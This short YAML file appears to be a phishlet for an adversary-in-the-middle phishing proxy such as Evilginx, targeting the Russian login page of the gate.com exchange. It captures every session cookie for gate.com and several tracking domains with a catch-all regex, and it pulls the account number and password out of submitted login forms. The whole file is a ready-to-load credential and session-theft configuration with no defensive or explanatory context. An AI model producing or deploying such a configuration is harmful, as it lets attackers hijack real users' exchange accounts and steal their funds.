auth_tokens:
  - domain: '.gate.com'
    keys: ['.*,regexp']
  - domain: '.google.ru'
    keys: ['.*,regexp']
  - domain: 'www.gate.com'
    keys: ['.*,regexp']
  - domain: '.www.google-analytics.com'
    keys: ['.*,regexp']
  - domain: '.appsflyer.com'
    keys: ['.*,regexp']
auth_urls:
  - '/ru'

credentials:
  username:
    key: 'account_number'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.gate.com'
  path: '/ru/login'
